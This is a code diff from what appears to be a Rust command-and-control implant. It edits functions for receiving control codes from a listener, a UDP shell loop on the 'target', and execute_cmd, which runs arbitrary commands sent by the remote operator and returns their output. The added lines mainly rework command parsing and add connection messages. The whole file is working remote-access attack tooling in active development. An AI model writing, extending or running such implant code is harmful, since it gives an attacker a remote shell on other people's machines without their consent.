@@ -222,7 +222,7 @@ fn rcv_client_command(lsn: &mut Listener, sb: &mut Arc<Mutex<SharedBuffer>>) -> 
     let cc = sb_ref.cc;
     //let confirm = format!("Control Code Recieved: {cc}");
     //sb_ref.buff = confirm.as_bytes().to_vec();
-    return sb_ref.cc;
+    return cc;
 }
 
 // Returns a string containing the full info of a given listener
@@ -270,6 +270,7 @@ pub fn decode_http(){
 
 // creates a shell on the target
 pub fn shell(sock: &mut UdpSocket) {
+    println!("Shell Started!");
     loop {
         // checks if shell is being terminated
         let mut cc = [0; 1];
@@ -296,30 +297,38 @@ pub fn shell(sock: &mut UdpSocket) {
 
 // executes a single arbitrary command
 pub fn execute_cmd(s: String) -> String {
-    //if s.contains(' ') {
-    let mut split = s.trim().split_whitespace();
-    let head = split.next().unwrap();
-    let tail = split;
-    match head {
-        "cd" => {
-            let new_dir = tail.peekable().peek().map_or("/", |x| *x);
-            let root = Path::new(new_dir);
-            match std::env::set_current_dir(&root) {
-                Err(e) => return format!("{}", e),
-                Ok(k) => todo!(),
-            }
-        },
-        "exit" => return String::new(),
-        head => {
-            let cmd = Command::new(head).args(tail).output().unwrap();
-            return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
-        },
+    if s.trim().contains(' ') {
+        let mut split = s.trim().split_whitespace();
+        let head = split.next().unwrap();
+        let tail = split;
+        match head {
+            "cd" => {
+                let new_dir = tail.peekable().peek().map_or("/", |x| *x);
+                let root = Path::new(new_dir);
+                match std::env::set_current_dir(&root) {
+                    Err(e) => return format!("{}", e),
+                    Ok(k) => todo!(),
+                }
+            },
+            head => {
+                let cmd = Command::new(head).args(tail).output().unwrap();
+                return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
+            },
+        }
     }
-    /*}
     else {
-        let cmd = Command::new(s).output().unwrap();
-        return String::from_utf8(cmd.stdout).expect("Found invalid UTF-8");
-    }*/
+        let tmp = s.trim();
+        match tmp {
+            "exit" => return String::new(),
+            tmp => {
+                let cmd = Command::new(tmp).output();
+                match cmd {
+                    Ok(c) => return String::from_utf8(c.stdout).expect("Found invalid UTF-8"),
+                    Err(e) => return format!("{}", e),
+                }
+            }
+        }
+    }
 }
 
 // main method for implants
@@ -358,6 +367,8 @@ fn imp_udp(lsn_addr: SocketAddr) {
             break;
         }
     }
+
+    println!("Connected");
 
     // once connected, listen for control code in a loop and use a match to determine what to do
     loop {
